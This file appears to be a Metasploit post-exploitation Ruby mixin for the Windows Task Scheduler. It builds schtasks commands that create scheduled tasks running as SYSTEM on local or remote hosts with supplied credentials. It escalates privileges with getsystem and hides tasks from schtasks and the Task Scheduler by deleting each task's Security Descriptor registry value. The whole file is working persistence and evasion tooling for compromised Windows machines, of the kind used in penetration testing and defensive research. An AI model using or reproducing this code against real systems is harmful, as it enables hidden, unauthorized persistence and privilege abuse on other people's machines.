# -*- coding: binary -*-

module Msf
  class Post
    module Windows
      #
      # Post module mixin for dealing with Windows Task Scheduler
      #
      module TaskScheduler # rubocop:disable Metrics/ModuleLength
        include ::Msf::Post::Common

        class TaskSchedulerError < StandardError; end

        TASK_REG_KEY = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree'.freeze
        TASK_SD_REG_VALUE = 'SD'.freeze
        # This Security Descriptor is for builtin 'Guest' user and built-in 'Guests'
        # group. This has been generated from the following security descriptor
        # string: "O:BGG:BG"
        DEFAULT_SD = "\x01\x00\x00\x80\x14\x00\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
                     "\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x22\x02\x00\x00\x01\x02\x00\x00"\
                     "\x00\x00\x00\x05\x20\x00\x00\x00\x22\x02\x00\x00".freeze

        def initialize(info = {})
          super

          register_advanced_options(
            [
              OptEnum.new(
                'ScheduleType', [
                  true,
                  'Schedule frequency for the new created task.',
                  'ONSTART',
                  %w[MINUTE HOURLY DAILY WEEKLY MONTHLY ONCE ONSTART ONLOGON ONIDLE]
                ]
              ),
              OptInt.new(
                'ScheduleModifier', [
                  false,
                  'Schedule frequency modifier. This defines the amount of minutes/hours/days/weeks/months,'\
                  ' depending on the ScheduleType value. When ONIDLE type is used, this represents how many'\
                  ' minutes the computer is idle before the task starts. This value is not used with ONCE, '\
                  'ONSTART and ONLOGON types.',
                  1
                ]
              ),
              OptString.new(
                'ScheduleRemoteSystem', [
                  false,
                  'The remote system to connect to. Use a FQDN to avoid long delays due to automatic DNS resolutions.'
                ]
              ),
              OptString.new(
                'ScheduleUsername', [
                  false,
                  'Use the permissions of this remote user account to schedule the task remotely (e.g. '\
                  'MYDOMAIN\User1 or .\Administrator). This requires \'ScheduleRemoteSystem\' to be set.'
                ]
              ),
              OptString.new(
                'SchedulePassword', [
                  false,
                  'Password of the remote user account set in \'ScheduleUsername\'. This requires '\
                  '\'ScheduleUsername\' and \'ScheduleRemoteSystem\' to be set.'
                ]
              ),
              OptString.new(
                'ScheduleRunAs', [
                  false,
                  'Execute the task under this user account (default: SYSTEM).',
                  'SYSTEM'
                ]
              ),
              OptBool.new(
                'ObfuscateTask', [
                  false,
                  'Hide the task from "schtasks /query" and Task Scheduler by deleting the '\
                  'associated Security Descriptor registry value. Note that SYSTEM privileges '\
                  'are needed for this. It will try to elevate privileges if the session is not '\
                  'already running under the SYSTEM user.',
                  true
                ]
              )
            ], self.class
          )
        end

        def get_schtasks_cmd_string(schtasks_cmd, opts = {})
          schtasks_cmd.prepend('schtasks')
          system = opts[:remote_system] || datastore['ScheduleRemoteSystem']
          schtasks_cmd += ['/s', system] if system
          username = opts[:username] || datastore['ScheduleUsername']
          schtasks_cmd += ['/u', username] if username
          password = opts[:password] || datastore['SchedulePassword']
          schtasks_cmd += ['/p', password] if password
          schtasks_cmd.join(' ')
        end

        def schtasks_exec(schtasks_cmd_str)
          dlog("[Task Scheduler] execute command: #{schtasks_cmd_str}")
          # Using a longer timeout in case the task scheduler operation takes place
          # on a remote host. The default timeout is not enough.
          result = cmd_exec(schtasks_cmd_str, nil, 120)
          unless result.include?('SUCCESS:')
            raise TaskSchedulerError, "Could not executing command '#{schtasks_cmd_str}'. Error: #{result}"
          end
        end

        def execute_cmd(cmd)
          verification_token = Rex::Text.rand_text_alphanumeric(8)
          result = cmd_exec("cmd /c #{cmd} & if not errorlevel 1 echo #{verification_token}")
          result.include?(verification_token)
        end

        def delete_reg_key_value(reg_key, reg_value)
          dlog('[Task Scheduler] Remove the Security Descriptor registry key value to hide the task')

          unless is_system?
            dlog('[Task Scheduler] Try to get SYSTEM privilege')
            results = session.priv.getsystem
            if results[0]
              dlog('[Task Scheduler] Got SYSTEM privilege')
            else
              raise TaskSchedulerError, 'Could not obtain SYSTEM privilege, which is needed to delete the key value.'
            end
          end

          remote_host = datastore['ScheduleRemoteSystem']
          dlog("[Task Scheduler] Deleting #{reg_value} in #{reg_key}#{" on remote host #{remote_host}" if remote_host}")
          if remote_host
            task_name = Rex::Text.rand_text_alpha(rand(8..15))
            begin
              dlog("[Task Scheduler] Creating the remote task #{task_name} to run 'reg delete'")
              opts = { task_type: 'ONCE', runas: 'SYSTEM', obfuscate: false }
              task_cmd = "reg delete \\\"#{reg_key}\\\" /v \\\"#{reg_value}\\\" /f"
              task_create(task_name, task_cmd, opts)
            rescue TaskSchedulerError => e
              dlog("[Task Scheduler] Error while creating a remote task to delete the registry key value: #{e}")
              raise
            end
            begin
              dlog("[Task Scheduler] Starting the remote task #{task_name}")
              task_start(task_name)
            rescue TaskSchedulerError => e
              dlog("[Task Scheduler] Error while starting the task to delete the registry key value: #{e}")
              raise
            end
            begin
              dlog("[Task Scheduler] Delete the remote task #{task_name}")
              task_delete(task_name, { obfuscate: false })
            rescue TaskSchedulerError => e
              dlog("[Task Scheduler] Error while starting the task to delete the registry key value: #{e}")
              raise
            end
          else
            unless registry_deleteval(reg_key, reg_value)
              raise TaskSchedulerError, 'Could not delete the key value.'
            end
          end
        end

        def task_create(task_name, task_cmd, opts = {})
          schtasks_cmd = ['/create']
          task_type = opts[:task_type] || datastore['ScheduleType']
          schtasks_cmd += ['/tn', "\"#{task_name}\"", '/tr', "\"#{task_cmd}\"", '/sc', task_type, '/f']
          if %w[MINUTE HOURLY DAILY WEEKLY MONTHLY ONIDLE].include?(task_type)
            modifier = opts[:modifier] || datastore['ScheduleModifier'].to_s
            schtasks_cmd += ['/mo', modifier]
          end
          schtasks_cmd += ['/st', '00:00:00'] if task_type == 'ONCE'
          runas = opts[:runas] || datastore['ScheduleRunAs'] || 'SYSTEM'
          schtasks_cmd += ['/ru', runas]

          begin
            schtasks_exec(get_schtasks_cmd_string(schtasks_cmd, opts))
          rescue TaskSchedulerError => e
            dlog("[Task Scheduler] Task creation failed: #{e}")
            raise
          end

          # We want to make sure `opts` has preference over the datastore option
          if opts[:obfuscate].nil?
            return unless datastore['ObfuscateTask']
          else
            return unless opts[:obfuscate]
          end

          begin
            delete_reg_key_value("#{TASK_REG_KEY}\\#{task_name}", TASK_SD_REG_VALUE)
          rescue TaskSchedulerError => e
            dlog("[Task Scheduler] Task obfuscation failed: #{e}")
            raise TaskSchedulerError, "Task obfuscation failed (the task has been created but won\'t be hidden): #{e}"
          end
        end

        def task_start(task_name, opts = {})
          schtasks_cmd = ['/run', '/tn', task_name, '/i']
          schtasks_exec(get_schtasks_cmd_string(schtasks_cmd, opts))
        end

        def task_delete(task_name, opts = {})
          # We want to make sure `opts` has preference over the datastore option
          if opts[:obfuscate].nil? && datastore['ObfuscateTask'] ||
             !opts[:obfuscate].nil? && opts[:obfuscate]
            unless is_system?
              dlog('[Task Scheduler] Trying to get SYSTEM privilege')
              results = session.priv.getsystem
              if results[0]
                dlog('[Task Scheduler] Got SYSTEM privilege')
              else
                dlog('[Task Scheduler] Could not obtain SYSTEM privilege')
                return false
              end
            end

            dlog('[Task Scheduler] Restoring registry key value')
            result = registry_setvaldata("#{TASK_REG_KEY}\\#{task_name}", TASK_SD_REG_VALUE, DEFAULT_SD, 'REG_BINARY')
            return false if result.nil? || !result
          end

          schtasks_cmd = ['/delete', '/tn', task_name, '/f']
          schtasks_exec(get_schtasks_cmd_string(schtasks_cmd, opts))
        end
      end
    end
  end
end
